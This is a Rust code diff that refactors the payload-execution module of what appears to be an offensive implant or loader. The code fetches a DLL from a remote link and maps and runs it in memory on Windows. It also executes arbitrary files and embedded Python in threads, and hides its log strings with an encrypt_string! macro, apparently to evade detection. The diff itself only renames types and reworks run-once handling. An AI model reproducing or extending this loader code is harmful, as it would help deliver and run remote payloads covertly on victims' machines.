@@ -34,10 +34,9 @@ use log::debug;
 use log::error;
 use log::info;
 
-pub enum PayloadExec {
+pub enum PayloadExecThread {
     NoThread(),
     Thread(thread::JoinHandle<()>, Payload),
-    RunOnce(Payload),
 }
 
 /*
@@ -57,7 +56,7 @@ pub enum Payload {
     Exec(Exec),
 }
 impl Payload {
-    pub fn exec_payload(&self, config: &Config) -> PayloadExec {
+    pub fn exec_payload(&self, config: &Config) -> PayloadExecThread {
         let exec_result = match &self {
             Payload::Banner() => banner(),
             Payload::WriteFile(payload) => payload.write_file(config),
@@ -67,13 +66,12 @@ impl Payload {
             Payload::DllFromMemory(payload) => payload.dll_from_memory(config),
         };
 
-        // TODO ici le runOnce en fail, il faudrait pas renvoyer NoThread mais vérifier si c'était un RunOnce (avec un match self)
         match exec_result {
             Ok(a) => a,
             Err(e) => {
                 error!("{}{}", encrypt_string!("exec error: "), e);
 
-                PayloadExec::NoThread()
+                PayloadExecThread::NoThread()
             }
         }
     }
@@ -91,7 +89,7 @@ impl Payload {
         let other_serialized = serde_json::to_string(other_payload).unwrap();
         self_serialized == other_serialized
     }
-    pub fn is_already_running(&self, run_data: &mut RunData) -> bool {
+    pub fn is_already_running_or_runonce(&self, run_data: &mut RunData) -> bool {
         for running_payload in &mut *run_data.running_thread {
             if self.is_same_payload(&running_payload.1) {
                 info!("{}", encrypt_string!("Payload is already running"));
@@ -106,6 +104,18 @@ impl Payload {
         }
         return false;
     }
+
+    pub fn is_runonce(&self) -> bool {
+        match &self {
+            Payload::Banner() => false,
+            Payload::WriteFile(payload) => false,
+            Payload::WriteZip(payload) => false,
+            Payload::Exec(payload) => payload.runonce,
+            Payload::ExecPython(payload) => false,
+            Payload::DllFromMemory(payload) => payload.runonce,
+        }
+    }
+
 }
 
 #[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
@@ -118,13 +128,13 @@ pub struct DllFromMemory {
 
 impl DllFromMemory {
     #[cfg(target_os = "linux")]
-    pub fn dll_from_memory(&self, _config: &Config) -> Result<PayloadExec, anyhow::Error> {
+    pub fn dll_from_memory(&self, _config: &Config) -> Result<PayloadExecThread, anyhow::Error> {
         fail_linux_message(format!("{}", encrypt_string!("DllFromMemory")));
-        Ok(PayloadExec::RunOnce(Payload::DllFromMemory(self.clone())))
+        Ok(PayloadExecThread::NoThread())
     }
 
     #[cfg(target_os = "windows")]
-    pub fn dll_from_memory(&self, config: &Config) -> Result<PayloadExec, anyhow::Error> {
+    pub fn dll_from_memory(&self, config: &Config) -> Result<PayloadExecThread, anyhow::Error> {
         let data: Vec<u8> = self.link.fetch_data(config)?;
 
         if self.thread {
@@ -148,14 +158,10 @@ impl DllFromMemory {
                 let result = dll_entry_point();
                 debug!("{}{}", encrypt_string!("DLL result = "), result);
             });
-            if self.runonce {
-                return Ok(PayloadExec::RunOnce(Payload::DllFromMemory(self.clone())));
-            } else {
-                return Ok(PayloadExec::Thread(
+                return Ok(PayloadExecThread::Thread(
                     dllthread,
                     Payload::DllFromMemory(self.clone()),
                 ));
-            };
         } else {
             let dll_data: &[u8] = &data;
             info!("{}", encrypt_string!("Map DLL in memory"));
@@ -173,7 +179,7 @@ impl DllFromMemory {
 
             let result = dll_entry_point();
             debug!("{}{}", encrypt_string!("DLL result = "), result);
-            return Ok(PayloadExec::NoThread());
+            return Ok(PayloadExecThread::NoThread());
         }
         // TODO quand on part d'ici, il y a un probleme
     }
@@ -187,13 +193,13 @@ pub struct ExecPython {
 }
 impl ExecPython {
     #[cfg(target_os = "linux")]
-    pub fn exec_python_with_embedder(&self) -> Result<PayloadExec, anyhow::Error> {
+    pub fn exec_python_with_embedder(&self) -> Result<PayloadExecThread, anyhow::Error> {
         fail_linux_message(format!("{}", encrypt_string!("ExecPython")));
-        Ok(PayloadExec::NoThread())
+        return Ok(PayloadExecThread::NoThread());
     }
 
     #[cfg(target_os = "windows")]
-    pub fn exec_python_with_embedder(&self) -> Result<PayloadExec, anyhow::Error> {
+    pub fn exec_python_with_embedder(&self) -> Result<PayloadExecThread, anyhow::Error> {
         //use crate::python_embedder;
 
         let path: PathBuf = calculate_path(&self.path)?;
@@ -209,15 +215,15 @@ impl ExecPython {
             let tj: thread::JoinHandle<()> = thread::spawn(move || {
                 python_embedder::embedder(&thread_python_path, &thread_python_code);
             });
-            return Ok(PayloadExec::Thread(tj, Payload::ExecPython(self.clone())));
+            return Ok(PayloadExecThread::Thread(tj, Payload::ExecPython(self.clone())));
         } else {
             python_embedder::embedder(&path, &self.python_code);
-            return Ok(PayloadExec::NoThread());
+            return Ok(PayloadExecThread::NoThread());
         }
     }
 }
 
-pub fn banner() -> Result<PayloadExec, anyhow::Error> {
+pub fn banner() -> Result<PayloadExecThread, anyhow::Error> {
     //TODO encrypt this str
     let banner: &str = r#"
                                  ╓╖
@@ -251,7 +257,7 @@ pub fn banner() -> Result<PayloadExec, anyhow::Error> {
     println!("");
     let sleep_time = time::Duration::from_millis(3000);
     thread::sleep(sleep_time);
-    Ok(PayloadExec::NoThread())
+    Ok(PayloadExecThread::NoThread())
 }
 
 #[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
@@ -261,7 +267,7 @@ pub struct WriteZip {
 }
 
 impl WriteZip {
-    pub fn write_zip(&self, config: &Config) -> Result<PayloadExec, anyhow::Error> {
+    pub fn write_zip(&self, config: &Config) -> Result<PayloadExecThread, anyhow::Error> {
         //TODO found a way, not to recreate everything every time this payload run
         let path: PathBuf = calculate_path(&self.path)?;
         let _ = create_diretory(&path)?;
@@ -280,7 +286,7 @@ impl WriteZip {
             }
         }
 
-        Ok(PayloadExec::NoThread())
+        Ok(PayloadExecThread::NoThread())
     }
 }
 
@@ -292,7 +298,7 @@ pub struct WriteFile {
 }
 
 impl WriteFile {
-    pub fn write_file(&self, config: &Config) -> Result<PayloadExec, anyhow::Error> {
+    pub fn write_file(&self, config: &Config) -> Result<PayloadExecThread, anyhow::Error> {
         let path: PathBuf = calculate_path(&self.path)?;
 
         if same_hash_sha512(&self.hash, &path) == false {
@@ -306,7 +312,7 @@ impl WriteFile {
         } else {
             info!("{}{:?}", encrypt_string!("[+] No Write, same hash: "), path);
         }
-        Ok(PayloadExec::NoThread())
+        Ok(PayloadExecThread::NoThread())
     }
 }
 
@@ -319,7 +325,7 @@ pub struct Exec {
 }
 impl Exec {
     // https://doc.rust-lang.org/std/process/struct.Command.html
-    pub fn exec_file(&self) -> Result<PayloadExec, anyhow::Error> {
+    pub fn exec_file(&self) -> Result<PayloadExecThread, anyhow::Error> {
         let path: PathBuf = calculate_path(&self.path)?;
         info!("{}{:?} {}", encrypt_string!("Exec "), &path, &self.cmdline);
         let mut comm = Command::new(&path);
@@ -337,21 +343,13 @@ impl Exec {
                     .expect(&encrypt_string!("failed to execute process"));
                 let _ = c.wait();
             });
-            if self.runonce {
-                return Ok(PayloadExec::RunOnce(Payload::Exec(self.clone())));
-            } else {
-                return Ok(PayloadExec::Thread(tj, Payload::Exec(self.clone())));
-            };
+            return Ok(PayloadExecThread::Thread(tj, Payload::Exec(self.clone())));
         } else {
             let _output: std::process::Output = comm
                 .output()
                 .expect(&encrypt_string!("failed to execute process"));
             //let _hello: Vec<u8> = output.stdout;
-            if self.runonce {
-                return Ok(PayloadExec::RunOnce(Payload::Exec(self.clone())));
-            } else {
-                return Ok(PayloadExec::NoThread());
-            };
+                return Ok(PayloadExecThread::NoThread());
         };
     }
 }
